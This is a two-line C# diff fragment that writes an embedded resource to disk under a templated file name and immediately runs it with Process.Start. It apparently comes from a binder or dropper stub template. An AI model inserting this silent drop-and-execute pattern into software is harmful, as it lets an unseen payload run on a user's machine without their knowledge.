@@ -1,0 +1,2 @@
+﻿ System.IO.File.WriteAllBytes(path +"{filname}", (byte[])m.GetObject("{ressources}"));
+                System.Diagnostics.Process.Start(path + "{filname}");
